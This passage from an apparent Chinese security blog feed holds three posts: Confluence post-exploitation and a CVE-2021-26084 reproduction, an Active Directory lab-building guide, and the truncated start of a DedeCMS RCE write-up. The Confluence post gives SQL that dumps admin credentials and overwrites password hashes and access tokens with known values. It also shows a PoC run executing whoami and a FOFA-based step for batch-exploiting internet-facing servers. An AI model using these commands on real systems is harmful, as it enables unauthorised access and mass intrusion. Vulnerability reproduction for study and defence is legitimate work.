class="line">directory_id:用户组，代表用户的权限</span><br></pre></td></tr></table></figure><p><code>directory_id</code>对应的具体用户组名称可通过以下方式查看：</p><ul><li>查询表cwd_group中的<code>group_name</code>列，管理员用户组的值为<code>confluence-administrators</code></li><li>查询表cwd_directory中的<code>directory_name</code>列，管理员用户组的值为<code>Confluence Internal Directory</code></li></ul><p>直接筛选出管理员用户的SQL命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; select u.id,u.user_name,u.active,u.credential from cwd_user u  join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id where g.group_name = &#x27;confluence-administrators&#x27; and d.directory_name=&#x27;Confluence Internal Directory&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116215013197.png" alt="image-20211116215013197"></p><p>4.日志文件位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;confluence-home&gt;/logs/</span><br></pre></td></tr></table></figure><p>5.Web路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;confluence-installation&gt;/confluence/</span><br></pre></td></tr></table></figure><p>Windows: Confluence默认权限为network service，具有写权限</p><p>Linux： Confluence默认权限为confluence，没有写权限</p><h2 id="0x03-利用思路"><a href="#0x03-利用思路" class="headerlink" title="0x03 利用思路"></a>0x03 利用思路</h2><p>1.修改数据库，实现用户登录</p><p>(1)修改用户登录口令</p><p>查看用户关键信息，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; select id,user_name,credential from cwd_user;</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116215413204.png" alt="image-20211116215413204"></p><p>修改用户test1的口令信息，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; UPDATE cwd_user SET credential= &#x27;&#123;PKCS5S2&#125;UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm&#x27; WHERE id = 458754;</span><br></pre></td></tr></table></figure><p>确认数据库被修改，如下图</p><p><img src="/post/92f83c15/image-20211116215611858.png" alt="image-20211116215611858"></p><p><strong>注：</strong></p><p><code>&#123;PKCS5S2&#125;UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm</code>对应的明文为123456</p><p>(2)修改<code>Personal Access Tokens</code></p><p>使用<code>Personal Access Tokens</code>可以实现免密登录</p><p>介绍资料：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://confluence.atlassian.com/bitbucketserver0610/personal-access-tokens-989761177.html </span><br><span class="line"></span><br><span class="line">https://developer.atlassian.com/server/confluence/confluence-server-rest-api/ </span><br><span class="line"></span><br><span class="line">https://docs.atlassian.com/ConfluenceServer/rest/7.11.6/</span><br></pre></td></tr></table></figure><p>测试环境下，<code>Personal Access Tokens</code>对应表为<code>AO_81F455_PERSONAL_TOKEN</code></p><p>查询语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; select * from &quot;AO_81F455_PERSONAL_TOKEN&quot;;</span><br></pre></td></tr></table></figure><p>修改Personal Access Tokens，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; UPDATE &quot;AO_81F455_PERSONAL_TOKEN&quot; SET &quot;HASHED_TOKEN&quot;= &#x27;&#123;PKCS5S2&#125;Deoq/psifhVO0VE8qhJ6prfgOltOdJkeRH4cIxac9NtoXVodRQJciR95GW37gR7/&#x27; WHERE &quot;ID&quot; = 4;</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;PKCS5S2&#125;Deoq/psifhVO0VE8qhJ6prfgOltOdJkeRH4cIxac9NtoXVodRQJciR95GW37gR7/`对应的token为`MjE0NTg4NjQ3MTk2OrQ5JtSJgT/rrRBmCY4zu+N+NaWZ</span><br></pre></td></tr></table></figure><p>2.写文件</p><p>Web路径：<code>&lt;confluence-installation&gt;/confluence/</code></p><p>Windows: Confluence默认权限为network service，具有写权限</p><p>Linux： Confluence默认权限为confluence，没有写权限，但可以尝试内存马</p><h2 id="0x04-CVE-2021-26084"><a href="#0x04-CVE-2021-26084" class="headerlink" title="0x04 CVE-2021-26084"></a>0x04 CVE-2021-26084</h2><p>1.受影响版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Confluence &lt; 6.13.23</span><br><span class="line">6.14.0 ≤ Confluence &lt; 7.4.11</span><br><span class="line">7.5.0 ≤ Confluence &lt; 7.11.6</span><br><span class="line">7.12.0 ≤ Confluence &lt; 7.12.5</span><br><span class="line">Confluence &lt; 7.13.0</span><br></pre></td></tr></table></figure><p>2.不受影响的版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Confluence=6.13.23</span><br><span class="line">Confluence=7.4.11</span><br><span class="line">Confluence=7.11.6</span><br><span class="line">Confluence=7.12.5</span><br><span class="line">Confluence=7.13.0</span><br></pre></td></tr></table></figure><p>3.漏洞poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、https://github.com/FanqXu/CVE-2021-26084</span><br><span class="line"></span><br><span class="line">2、https://github.com/h3v0x/CVE-2021-26084_Confluence/</span><br><span class="line"></span><br><span class="line">3、https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</span><br></pre></td></tr></table></figure><p>4.漏洞复现</p><p>执行FanqXu/CVE-2021-26084的poc进行验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Poc.py -u http://10.108.3.65:8090/</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116221215478.png" alt="image-20211116221215478"></p><p>执行命令<code>whoami</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Poc.py -u http://10.108.3.65:8090/ -e whoami</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116221906318.png" alt="image-20211116221906318"></p><p>5.fofa批量</p><p>关键字搜索<code>app=&quot;ATLASSIAN-Confluence&quot;</code></p><p>使用fofa工具导出结果存到urls.txt，再使用FanqXu/CVE-2021-26084的poc进行批量验证即可。</p><p>使用的命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PoC.py -f urls.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>大型域环境搭建</title>
    <link href="http://lvpsectime.github.io/post/e14d201f.html"/>
    <id>http://lvpsectime.github.io/post/e14d201f.html</id>
    <published>2021-11-07T12:52:13.000Z</published>
    <updated>2021-11-09T03:29:12.916Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h2><table><thead><tr><th>角色</th><th>操作系统</th><th>IP</th></tr></thead><tbody><tr><td>辅域控制器</td><td>Windows server 2016</td><td>10.10.10.10</td></tr><tr><td>辅域控制器</td><td>Windows server 2016</td><td>10.10.10.11</td></tr><tr><td>子域控制器</td><td>Windows server 2016</td><td>10.10.10.20</td></tr><tr><td>父域用户</td><td>Windows server 2012</td><td>10.10.10.15</td></tr><tr><td>子域用户</td><td>Windows 7</td><td>10.10.10.21</td></tr><tr><td>VPS</td><td>Windows 7</td><td>10.10.10.50</td></tr></tbody></table><p>首先在VMware中添加一个网卡，点击”编辑” –&gt; “虚拟网络编辑器”</p><p><img src="/post/e14d201f/image-20211107213455039.png" alt="image-20211107213455039"></p><p>按如下图所示配置即可</p><p><img src="/post/e14d201f/image-20211107213714952.png" alt="image-20211107213714952"></p><h2 id="父域"><a href="#父域" class="headerlink" title="父域"></a>父域</h2><p>修改计算机名，右键”此电脑”，属性，更改设置，然后重启</p><p><img src="/post/e14d201f/image-20211107214621093.png" alt="image-20211107214621093"></p><p>打开一个Windows server 2016，配置静态IP地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP地址：10.10.10.10</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10 （本机IP）</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211107213925947.png" alt="image-20211107213925947"></p><p>打开服务器管理器，点击左下角的开始，点击”服务器管理器”</p><p><img src="/post/e14d201f/image-20211107214216451.png" alt="image-20211107214216451"></p><p>点击”添加角色和功能”</p><p><img src="/post/e14d201f/image-20211107214302060.png" alt="image-20211107214302060"></p><p>直接下一步</p><p><img src="/post/e14d201f/image-20211107214329098.png" alt="image-20211107214329098"></p><p>“基于角色或基于功能的安装”，下一步</p><p><img src="/post/e14d201f/image-20211107214353563.png" alt="image-20211107214353563"></p><p>“从服务器池中选择服务器”，下一步</p><p><img src="/post/e14d201f/image-20211107214932232.png" alt="image-20211107214932232"></p><p>勾选”Active Directory 域服务 “，”添加功能”，下一步</p><p><img src="/post/e14d201f/image-20211107215158743.png" alt="image-20211107215158743"></p><p><img src="/post/e14d201f/image-20211107215218666.png" alt="image-20211107215218666"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211107215314991.png" alt="image-20211107215314991"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211107215333216.png" alt="image-20211107215333216"></p><p>安装</p><p><img src="/post/e14d201f/image-20211107215355505.png" alt="image-20211107215355505"></p><p>等待安装完成，点击”将此服务器提升为域控制器”</p><p><img src="/post/e14d201f/image-20211107215529382.png" alt="image-20211107215529382"></p><p>选择”添加新林”，输入根域名<code>sectime.top</code>，域名确定之后就不能在更改，下一步</p><p><img src="/post/e14d201f/image-20211107215626062.png" alt="image-20211107215626062"></p><p>输入密码，下一步</p><p><img src="/post/e14d201f/image-20211107215755564.png" alt="image-20211107215755564"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211107220028155.png" alt="image-20211107220028155"></p><p>默认，下一步</p><p><img src="/post/e14d201f/image-20211107220100290.png" alt="image-20211107220100290"></p><p>默认，下一步</p><p><img src="/post/e14d201f/image-20211107220135701.png" alt="image-20211107220135701"></p><p>默认，下一步</p><p><img src="/post/e14d201f/image-20211107220156640.png" alt="image-20211107220156640"></p><p>先决条件检查成功，点击”安装”</p><p>这里如果遇到报错情况：<strong>域控制器升级的先决条件验证失败。本地 Administrator 帐户将成为域 Administrator 帐户。无法新建域，因为本地 Administrator 帐户密码不符合要求</strong>，原因是因为 administrator 当前机器没有设置密码且密码是一个弱密码，我们只需要给 administrator 设置一个强密码即可！我们以管理员权限打开命令提示符给 administrator 设置一个新密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user administrator admin!@#45</span><br><span class="line">net user administrator /passwordreq:yes</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211107220252065.png" alt="image-20211107220252065"></p><p>等待域控制器安装完毕后它会重启一遍机器</p><p>之后DNS被修改为了127.0.0.1，改回本机的IP</p><p><img src="/post/e14d201f/image-20211107224925008.png" alt="image-20211107224925008"></p><p><img src="/post/e14d201f/image-20211107224942637.png" alt="image-20211107224942637"></p><p>如果出现”Windows无法访问指定设备、路径或文件。你可能没有适当的权限访问该项目”，可以尝试下面的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 在受影响的工作站上使用域管理员账号登录，打开工作站的“本地安全策略”，找到“本地策略”——“安全选项”——“用户账户控制：用于内置管理员账户的管理员批准模式”，选择“已启用”，然后重启电脑。</span><br><span class="line">2. 检查 “Secondary Logon”登录服务是否自动运行。 运行services.msc 找到 Secondary Logon 将其更改为自动运行。重启电脑后测试问题是否解决。</span><br></pre></td></tr></table></figure><p>现在主域控制器和 DNS 集成，为了让后期搭建完辅域控制器的 DNS 同步主域控制器 DNS ，需要把主域控制器的 DNS 服务器_msdcs.sectime.top 和 sectime.top 的起始授权机构(SOA)区域传送设置成允许:</p><p>打开DNS管理器</p><p><img src="/post/e14d201f/image-20211107225555326.png" alt="image-20211107225555326"></p><p>DNS – DC1 – 正向查找区域 – _msdcs.sectime.top</p><p><img src="/post/e14d201f/image-20211107225925517.png" alt="image-20211107225925517"></p><p><img src="/post/e14d201f/image-20211107230058778.png" alt="image-20211107230058778"></p><p>至此主域控制器搭建完成</p><h2 id="父域添加用户"><a href="#父域添加用户" class="headerlink" title="父域添加用户"></a>父域添加用户</h2><p>新建域管理员</p><p>打开”Active Directory 用户和计算机”</p><p><img src="/post/e14d201f/image-20211108230848249.png" alt="image-20211108230848249"></p><p>选择建好的域，右键”Users”，新建用户</p><p><img src="/post/e14d201f/image-20211108231030439.png" alt="image-20211108231030439"></p><p>输入如下信息</p><p><img src="/post/e14d201f/image-20211108231129222.png" alt="image-20211108231129222"></p><p>输入密码：DC123456..</p><p><img src="/post/e14d201f/image-20211108231247306.png" alt="image-20211108231247306"></p><p>完成</p><p><img src="/post/e14d201f/image-20211108231307972.png" alt="image-20211108231307972"></p><p>找到刚刚新建的用户，右键选择”属性”</p><p><img src="/post/e14d201f/image-20211108231345112.png" alt="image-20211108231345112"></p><p>将用户新增管理员组，点击”隶属于”，点击添加</p><p><img src="/post/e14d201f/image-20211108231447647.png" alt="image-20211108231447647"></p><p>点击”高级”</p><p><img src="/post/e14d201f/image-20211108231543901.png" alt="image-20211108231543901"></p><p>点击”立即查找”</p><p><img src="/post/e14d201f/image-20211108231638203.png" alt="image-20211108231638203"></p><p>依次重复添加以下三个组</p><p>Domain Admins; Enterprise Admins; Schema Admins</p><p><img src="/post/e14d201f/image-20211108231804881.png" alt="image-20211108231804881"></p><p>添加之后，点击确定</p><p><img src="/post/e14d201f/image-20211108231904977.png" alt="image-20211108231904977"></p><p>添加普通域用户liming，密码：work666..</p><p><img src="/post/e14d201f/image-20211108234603439.png" alt="image-20211108234603439"></p><p><img src="/post/e14d201f/image-20211108234640409.png" alt="image-20211108234640409"></p><p>重复操作新建用户zhangsan，密码：zs123456!</p><h2 id="把win2012加入父域"><a href="#把win2012加入父域" class="headerlink" title="把win2012加入父域"></a>把win2012加入父域</h2><p>配置win2012的IP信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP地址：10.10.10.15</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10 （父域控制器的IP）</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211109112218874.png" alt="image-20211109112218874"></p><p>修改计算机名为<code>work</code>，加入域：<code>sectime.top</code></p><p><img src="/post/e14d201f/image-20211109112347526.png" alt="image-20211109112347526"></p><p>输入父域控制器的用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">qwe123...</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211109112454323.png" alt="image-20211109112454323"></p><p>成功加入父域</p><p><img src="/post/e14d201f/image-20211109112555587.png" alt="image-20211109112555587"></p><p>重启即可</p><h2 id="辅域"><a href="#辅域" class="headerlink" title="辅域"></a>辅域</h2><p>把计算机名改为DC2</p><p><img src="/post/e14d201f/image-20211108220537374.png" alt="image-20211108220537374"></p><p>手动配置ip地址和dns服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IP : 10.10.10.11</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10（这个需要填父域控制器的IP）</span><br><span class="line">备选DNS：10.10.10.11（这个就填写自己的IP地址就好）</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211108220754675.png" alt="image-20211108220754675"></p><p>把DC2添加到父域</p><p><img src="/post/e14d201f/image-20211108222229747.png" alt="image-20211108222229747"></p><p><img src="/post/e14d201f/image-20211108222308141.png" alt="image-20211108222308141"></p><p>接下来安装域服务</p><p>“添加角色和功能”</p><p><img src="/post/e14d201f/image-20211108220917425.png" alt="image-20211108220917425"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108220937168.png" alt="image-20211108220937168"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108220958932.png" alt="image-20211108220958932"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108221020077.png" alt="image-20211108221020077"></p><p>勾选”Active Directory域服务”，点击”添加功能”，下一步</p><p><img src="/post/e14d201f/image-20211108221256738.png" alt="image-20211108221256738"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108221323959.png" alt="image-20211108221323959"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108221338690.png" alt="image-20211108221338690"></p><p>安装</p><p><img src="/post/e14d201f/image-20211108221359714.png" alt="image-20211108221359714"></p><p>将此服务器提升为域控制器</p><p><img src="/post/e14d201f/image-20211108221528377.png" alt="image-20211108221528377"></p><p>我们需要选择将域控制器添加到现有域 ，域名填写⽗域的域名：sectime.top，而 DC2\Administrator（当前用户）我们需要更改输入一下父域的域管账户密码：(这⾥需要注意的是，如果辅助域控之前没有加⼊主域控制器，我的当前登录凭据为灰⾊，只能选择备⽤凭据进⾏验证)</p><p><img src="/post/e14d201f/image-20211108222617216.png" alt="image-20211108222617216"></p><p><img src="/post/e14d201f/image-20211108222651790.png" alt="image-20211108222651790"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108222717560.png" alt="image-20211108222717560"></p><p>来到“域控制器选项 ”这里，我们需要选择默认选择域名系统（DNS）服务器和全局编录！填⼊设置新的 DSRM 密码：<code>qwe123...</code></p><p><img src="/post/e14d201f/image-20211108222847792.png" alt="image-20211108222847792"></p><p>选择“任何域控制”然后一直选择“下一步”，直到“安装”</p><p><img src="/post/e14d201f/image-20211108222935078.png" alt="image-20211108222935078"></p><p><img src="/post/e14d201f/image-20211108223213288.png" alt="image-20211108223213288"></p><p>默认，下一步</p><p><img src="/post/e14d201f/image-20211108223235292.png" alt="image-20211108223235292"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108223252421.png" alt="image-20211108223252421"></p><p>所有先决条件成功通过，安装</p><p><img src="/post/e14d201f/image-20211108223340186.png" alt="image-20211108223340186"></p><p>辅域控制器 DC2 安装完后系统会⾃动重启系统</p><p><img src="/post/e14d201f/image-20211108223451165.png" alt="image-20211108223451165"></p><p>辅助域控制器安装成功还需要设置一下 DNS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⾸选DNS为：10.10.10.11（辅域DNS）</span><br><span class="line">备⽤DNS为：10.10.10.10（⽗域DNS）</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211108223916925.png" alt="image-20211108223916925"></p><p>配置完首选 DNS 为辅域控制器的 IP 后，还需要设置一下：辅域控服务器重启后检查DNS服务器是否已获取到主域控制器传输过来的DNS服务器配置，检查正常后需要把辅域控制器的DNS服务器 _msdcs.sectime.top 和 sectime.top 的起始授权机构(SOA)区域传送设置成允许</p><p><img src="/post/e14d201f/image-20211108224050169.png" alt="image-20211108224050169"></p><p><img src="/post/e14d201f/image-20211108224158782.png" alt="image-20211108224158782"></p><p><img src="/post/e14d201f/image-20211108224239113.png" alt="image-20211108224239113"></p><p><img src="/post/e14d201f/image-20211108224316502.png" alt="image-20211108224316502"></p><p>到此辅域就安装完成，需要注意的是安装辅域控制器，如果主域控制器DNS和AD集成，辅域控制器会在安装AD后⾃动同步DNS记录</p><h2 id="子域"><a href="#子域" class="headerlink" title="子域"></a>子域</h2><p>子域控制器用的是 Windows Server 2016，因为搭建子域控制器必须要和主父域控制器的操作系统是同一个版本，不然你版本太低了会显示不兼容</p><p>搭建⼦域控制器前需要先把 DNS 指向主域控制器的 IP地址，然后委派完DNS再把⼦域控制器DNS指向⾃⼰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">⽗域控制器：sectime.top</span><br><span class="line">⼦域控制器：sec.sectime.top</span><br><span class="line"></span><br><span class="line">子域控制器：</span><br><span class="line">IP：10.10.10.20</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网光：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10（这个就是父域控制器的IP）</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211108224858872.png" alt="image-20211108224858872"></p><p>设置一下计算机名为：<code>DC3</code>，这个时候是不需要添加到域的</p><p><img src="/post/e14d201f/image-20211108225036009.png" alt="image-20211108225036009"></p><p>然后再次来到”服务器管理器”-“添加角色”，和之前创建域控的操作是一样的，安装完成后选择”将此服务器提升为域控制器”</p><p><img src="/post/e14d201f/image-20211108225421085.png" alt="image-20211108225421085"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选择部署操作：将新域添加到现有林</span><br><span class="line">选择域类型：⼦域 </span><br><span class="line">⽗域名：sectime.top </span><br><span class="line">新域名：sec </span><br><span class="line">凭据：填写⽗域的⽤户名密码即可</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211108225727651.png" alt="image-20211108225727651"></p><p>来到”域控制器选项”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域功能级别：windows Server 2016</span><br><span class="line">指定域控制器功能和站点信息：域名系统（DNS）服务器 、全局编录 </span><br><span class="line">填写新的DSRM密码: qwe123...</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211108225907747.png" alt="image-20211108225907747"></p><p>来到”DNS选项”，默认下一步就好</p><p><img src="/post/e14d201f/image-20211108225937454.png" alt="image-20211108225937454"></p><p>来到”其他选项”，NetBIOS 我们默认用系统设置的就好，点击”下一步“</p><p><img src="/post/e14d201f/image-20211108230004251.png" alt="image-20211108230004251"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108230102676.png" alt="image-20211108230102676"></p><p>下一步</p><p><img src="/post/e14d201f/image-20211108230117457.png" alt="image-20211108230117457"></p><p>所有先决条件检查成功通过，安装</p><p><img src="/post/e14d201f/image-20211108230159309.png" alt="image-20211108230159309"></p><p>安装完之后自动重启</p><p><img src="/post/e14d201f/image-20211108230325916.png" alt="image-20211108230325916"></p><p>当机器重启后我们还需要手动设置一下 DNS 修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⾸选DNS选择⼦域IP : 10.10.10.20</span><br><span class="line">备⽤DNS选择⽗域IP : 10.10.10.10</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211108232837856.png" alt="image-20211108232837856"></p><p>这个时候子域控制器就彻底安装成功了</p><h2 id="把win7加入子域"><a href="#把win7加入子域" class="headerlink" title="把win7加入子域"></a>把win7加入子域</h2><p>为win7配置IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP : 10.10.10.21</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：10.10.10.1</span><br><span class="line">首选DNS服务器：10.10.10.20（也就是子域控制器的IP）</span><br></pre></td></tr></table></figure><p><img src="/post/e14d201f/image-20211108233210176.png" alt="image-20211108233210176"></p><p>然后修改一下主机名为：<code>pc</code>，这个时候加入域的域名就是：<code>sec.sectime.top</code>：（账号密码需要输入子域控制器的密码：<code>administrator:zxc123...</code>）</p><p><img src="/post/e14d201f/image-20211108233352283.png" alt="image-20211108233352283"></p><p><img src="/post/e14d201f/image-20211108233533130.png" alt="image-20211108233533130"></p><p><img src="/post/e14d201f/image-20211108233551011.png" alt="image-20211108233551011"></p><p>重启即可</p><h2 id="为子域添加用户"><a href="#为子域添加用户" class="headerlink" title="为子域添加用户"></a>为子域添加用户</h2><p>点击”工具”，选择”Active Directory 用户和计算机”</p><p><img src="/post/e14d201f/image-20211108233730480.png" alt="image-20211108233730480"></p><p>点击”sec.sectime.top”，右键”Users”，新建用户</p><p><img src="/post/e14d201f/image-20211108233828019.png" alt="image-20211108233828019"></p><p>新建用户tom</p><p><img src="/post/e14d201f/image-20211108233903920.png" alt="image-20211108233903920"></p><p>输入密码：hello123…，勾选”密码永不过期”，下一步，点击”完成”</p><p><img src="/post/e14d201f/image-20211108233954871.png" alt="image-20211108233954871"></p><p>重复步骤新建用户：Jack，密码：hi123456…</p><p>用Tom用户登录win7</p><p><img src="/post/e14d201f/image-20211108234207479.png" alt="image-20211108234207479"></p><p><img src="/post/e14d201f/image-20211108234300634.png" alt="image-20211108234300634"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;主机信息&quot;&gt;&lt;a href=&quot;#主机信息&quot; class=&quot;headerlink&quot; title=&quot;主机信息&quot;&gt;&lt;/a&gt;主机信息&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;角色&lt;/th&gt;
&lt;th&gt;操作系统&lt;/th&gt;
&lt;th&gt;IP&lt;/th&gt;
&lt;/tr&gt;
</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://lvpsectime.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS_V5.8.1 ShowMsg 模板注入远程代码执行漏洞复现</title>
    <link href="http://lvpsectime.github.io/post/1d114771.html"/>
    <id>http://lvpsectime.github.io/post/1d114771.html</id>
    <published>2021-10-11T02:24:24.000Z</published>
    <updated>2021-10-11T05:22:41.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DedeCMS是国内专业的PHP网站内容管理系统-织梦内容管理系统，采用XML名字空间风格核心模板：模板全部使用文件形式保存，对用户设计模板、网站升级转移均提供很大的便利，健壮的模板标签为站长DIY自己的网站提供了强有力的支持。高效率标签缓存机制：允许对同类的标签进行缓存，在生成 HTML的时候，有利于提高系统反应速度，降低系统消耗的资源。模型与模块概念并存：在模型不能满足用户所有需求的情况下，DedeCMS推出一些互动的模块对系统进行补充，尽量满足用户的需求。众多的应用支持：为用户提供了各类网站建设的一体化解决方案。</p><p>该漏洞是由于DedeCMS存在变量覆盖漏洞，攻击者可利用该漏洞在未授权的情况下，构造恶意代码配合模板文件包含功能造成远程命令执行攻击，最终获取服务器最高权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正式版：&lt; v5.7.8(仅SQL注入)</span><br><span class="line"></span><br><span class="line">内测版：= v5.8.1_beta</span><br></pre></td></tr></table></figure><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>用户认证：未授权</li><li>触发方式：远程</li></ol><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" 